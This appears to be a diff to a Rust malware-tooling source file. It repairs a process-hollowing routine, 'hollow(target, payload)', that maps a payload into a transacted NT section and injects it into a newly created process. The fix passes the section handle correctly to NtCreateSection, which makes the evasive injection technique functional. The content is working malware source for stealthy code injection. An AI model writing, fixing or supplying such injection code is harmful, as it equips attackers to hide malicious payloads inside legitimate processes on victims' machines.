@@ -1,3 +1,4 @@
+#![feature(ptr_as_ref_unchecked)]
 #![no_std]
 
 extern crate alloc;
@@ -6,6 +7,7 @@ use alloc::vec;
 use alloc::vec::Vec;
 use core::ffi::c_void;
 use core::mem::zeroed;
+use core::ops::Deref;
 use core::ptr::{copy_nonoverlapping, null_mut};
 use ntapi::ntmmapi::{NtCreateSection, NtMapViewOfSection, ViewShare};
 use utils::path::Path;
@@ -158,10 +160,10 @@ where
         return Err(INVALID_HANDLE_VALUE as _);
     }
 
-    let section: HANDLE = null_mut();
+    let mut section: winapi::shared::ntdef::HANDLE = null_mut();
     if unsafe {
         NtCreateSection(
-            section as _,
+            &mut section as *mut winapi::shared::ntdef::HANDLE,
             SECTION_ALL_ACCESS,
             null_mut(),
             null_mut(),
@@ -187,7 +189,7 @@ where
         CloseHandle(transaction)
     };
 
-    Ok(section)
+    Ok(section as _)
 }
 
 pub fn create_new_process_internal<C, S>(cmd_line: C, start_dir: S) -> Option<PROCESS_INFORMATION>
@@ -404,8 +406,8 @@ pub fn hollow(target: &Path, payload: &[u8]) -> bool {
     fn try_hollow(target: &Path, payload: &[u8]) -> Option<()> {
         let tmp = Path::temp_file("tmp");
 
-        let section = make_transacted_section(tmp, payload).ok()?;
-        let pi = create_new_process_internal(target, target.parent()?)?;
+        let section = make_transacted_section(tmp.deref(), payload).ok()?;
+        let pi = create_new_process_internal(target.deref(), target.parent()?.deref())?;
 
         let (process, thread) = (pi.hProcess, pi.hThread);
 
